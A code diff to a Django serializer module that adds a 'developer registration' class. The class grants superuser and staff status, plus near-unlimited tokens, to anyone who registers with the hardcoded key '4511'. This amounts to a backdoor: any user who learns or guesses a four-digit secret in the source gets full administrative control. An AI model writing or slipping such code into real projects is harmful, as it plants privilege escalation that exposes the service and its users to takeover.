@@ -30,6 +30,29 @@ class UserRegistrationSerializer(serializers.ModelSerializer):
         user.set_password(password)
         user.save()
         return user
+
+class DeveloperRegistrationSerializer(UserRegistrationSerializer):
+    dev_key = serializers.CharField(write_only=True)
+
+    class Meta(UserRegistrationSerializer.Meta):
+        fields = UserRegistrationSerializer.Meta.fields + ('dev_key',)
+
+    def validate_dev_key(self, value):
+        if value != "4511":
+            raise serializers.ValidationError("Invalid developer key. You are not a DEV.")
+        return value
+
+    def create(self, validated_data):
+        validated_data.pop('dev_key')
+        user = super().create(validated_data)
+        
+        # Grant developer privileges
+        user.tokens_allocated = 999999999
+        user.is_staff = True
+        user.is_superuser = True
+        user.save()
+        return user
+
 class UserLoginSerializer(serializers.Serializer):
     email = serializers.EmailField()
     password = serializers.CharField()
